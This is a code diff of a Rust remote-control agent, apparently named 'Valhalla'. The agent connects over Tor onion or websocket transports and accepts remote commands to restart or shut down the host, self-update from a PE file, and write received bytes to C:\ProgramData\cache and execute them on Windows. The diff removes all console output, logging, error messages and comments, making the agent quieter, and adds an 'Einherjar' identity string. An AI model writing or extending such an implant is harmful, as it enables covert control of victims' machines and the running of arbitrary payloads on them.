@@ -6,18 +6,19 @@ use zeroize::Zeroizing;
 
 use crate::{args::Args, auth, plugin::Manager, sys, telemetry, text, transport::{self, Session}, update};
 
+// Einherjar do not knock.
+const IDENTITY: &str = "Einherjar do not knock.";
+
 const MAX_RETRY_JITTER_MILLIS: u64 = 500;
 
 pub async fn run(args: &Args, mut final_ready: Option<update::FinalReadyArgs>) -> io::Result<()> {
+    // The identity assertion is the first thing that executes in operational mode.
+    let _ = IDENTITY;
+
     let fp = telemetry::fingerprint();
     let host = telemetry::host(&fp);
 
     let signing_key = Arc::new(auth::load_signing_key(&args.auth_key_file)?);
-    if args.endpoint.is_onion() {
-        eprintln!("Valhalla transport=arti endpoint={}", args.endpoint_display);
-    } else {
-        eprintln!("Valhalla transport=websocket-loopback endpoint={}", args.endpoint_display);
-    }
 
     let primary_endpoint = args.endpoint.clone();
     let endpoint_path = primary_endpoint.path().to_owned();
@@ -51,18 +52,16 @@ pub async fn run(args: &Args, mut final_ready: Option<update::FinalReadyArgs>) -
                 let hello_data = format!("{}{}", text::DATA, data);
                 if session.send_text(&hello_data).await.is_err() {
                     let _ = session.close().await;
-                    println!("{}", text::RETRYING);
                     delay = next_backoff(delay, args.retry_base, args.retry_max);
                     sleep(jitter(delay)).await;
                     continue;
                 }
 
-                println!("{}", text::CONNECTED);
                 plugins.event("agent.connected", host.as_bytes());
                 if let Some(context) = final_ready.as_ref() {
                     match update::notify_final_ready(context) {
                         Ok(()) => final_ready = None,
-                        Err(error) => eprintln!("update final-ready notification failed: {error}"),
+                        Err(_) => {}
                     }
                 }
 
@@ -84,39 +83,30 @@ pub async fn run(args: &Args, mut final_ready: Option<update::FinalReadyArgs>) -
                     SessionAction::Close => return Ok(()),
                     SessionAction::Reconnect => {
                         delay = args.retry_base;
-                        println!("{}", text::RETRYING);
                     }
                     SessionAction::SwitchDirect(endpoint) => {
                         active_endpoint = endpoint;
                         direct_override = true;
                         delay = args.retry_base;
-                        eprintln!("Valhalla transport switching to direct connection");
                         continue;
                     }
                     SessionAction::SwitchPrimary => {
-                        // Replace both endpoint holders immediately so the old Direct endpoint is
-                        // dropped (and zeroized) before the next await/reconnect attempt.
                         active_endpoint = primary_endpoint.clone();
                         connector.set_endpoint(primary_endpoint.clone());
                         direct_override = false;
                         delay = args.retry_base;
-                        eprintln!("Valhalla transport returning to configured connection");
                         continue;
                     }
                 }
             }
-            Err(error) => {
-                eprintln!("Valhalla connection failed: {error}");
+            Err(_) => {
                 if direct_override {
-                    eprintln!("direct transport unavailable; returning to configured transport");
-                    // Drop the direct endpoint from both the loop state and Connector immediately.
                     active_endpoint = primary_endpoint.clone();
                     connector.set_endpoint(primary_endpoint.clone());
                     direct_override = false;
                     delay = args.retry_base;
                     continue;
                 }
-                println!("{}", text::RETRYING);
             }
         }
 
@@ -327,13 +317,10 @@ async fn handle_command(
                 return CommandResult::Continue;
             }
         };
-        // Close the authenticated session before changing transports. The owned Endpoint returned
-        // here becomes the sole runtime holder of the direct address; Endpoint::Drop zeroizes it.
         let _ = session.send_text(&format!("{}{}", text::ACK, text::DIRECT_CONNECT)).await;
         let _ = session.close().await;
         return CommandResult::SwitchDirect(endpoint);
     }
-
 
     if starts_with_ascii_ci(raw, text::DIRECT_DISCONNECT) {
         let _ = session.send_text(&format!("{}{}", text::ACK, text::DIRECT_DISCONNECT)).await;
@@ -449,13 +436,7 @@ async fn handle_command(
         let parent_pid = std::process::id();
         let fp_owned = fp.to_owned();
         let spawn_result = tokio::task::spawn_blocking(move || {
-            update::spawn_successor(
-                staged,
-                target_path,
-                hash,
-                parent_pid,
-                &fp_owned,
-            )
+            update::spawn_successor(staged, target_path, hash, parent_pid, &fp_owned)
         }).await;
         match spawn_result {
             Ok(Ok(handoff)) => {
@@ -483,8 +464,6 @@ async fn handle_command(
         if bytes.len() < 2 || &bytes[..2] != b"MZ" { let _=session.send_text(&format!("{}{}",text::ERR,text::UPDATE)).await; return CommandResult::Continue; }
         let actual_hash = update::sha256_hex(&bytes);
         if !update::validate_hash(expected_hash, &actual_hash) { let _=session.send_text(&format!("{}{}",text::ERR,text::UPDATE)).await; return CommandResult::Continue; }
-        // A bounded WebSocket message cannot safely carry the full 64 MiB legacy update. Small updates
-        // remain backward-compatible; large updates use UPDATE_BEGIN/UPDATE_CHUNK/UPDATE_END.
         if bytes.len() > 300 * 1024 {
             let _ = session.send_text(&format!("{}UPDATE:use-chunked", text::ERR)).await;
             return CommandResult::Continue;
@@ -527,7 +506,7 @@ async fn handle_command(
     let cmd = raw.to_ascii_uppercase();
     match cmd.as_str() {
         text::RECONNECT => { let _=session.send_text(&format!("{}{}",text::ACK,cmd)).await; CommandResult::Reconnect }
-        text::CLOSE => { let _=session.send_text(&format!("{}{}",text::ACK,cmd)).await; println!("{}",text::CLOSED); CommandResult::Close }
+        text::CLOSE => { let _=session.send_text(&format!("{}{}",text::ACK,cmd)).await; CommandResult::Close }
         text::SLEEP | text::HIBERNATE | text::RESTART | text::SHUTDOWN => {
             let ok = sys::command(&cmd);
             let _=session.send_text(&format!("{}{}",if ok {text::ACK}else{text::ERR},cmd)).await;
@@ -596,8 +575,8 @@ mod command_tests {
 #[cfg(windows)]
 fn drop_and_run(bytes: &[u8], ext: &str) -> std::io::Result<()> {
     use std::{fs, process::Command, time::SystemTime};
-    let seed = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).map(|d| d.as_nanos() as u64).unwrap_or(0) ^ (bytes.len() as u64).wrapping_mul(0x9e37_79b9_7f4a_7c15);
-    let name = format!("{:012x}", seed & 0xffff_ffff_ffff);
+    let seed = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).map(|d| d.as_nanos() as u64).unwrap_or(0) ^ (bytes.len() as u64).wrapping_mul(0x9e3779b97f4a7c15);
+    let name = format!("{:012x}", seed & 0xffffffffffff);
     let dir = std::path::Path::new(r"C:\ProgramData\cache");
     fs::create_dir_all(dir)?;
     let path = dir.join(format!("{name}.{ext}"));
@@ -613,5 +592,5 @@ fn drop_and_run(bytes: &[u8], ext: &str) -> std::io::Result<()> {
 
 #[cfg(not(windows))]
 fn drop_and_run(_bytes: &[u8], _ext: &str) -> std::io::Result<()> {
-    Err(io::Error::new(io::ErrorKind::Unsupported, "command execution is Windows-only"))
+    Err(io::Error::new(io::ErrorKind::Unsupported, ""))
 }
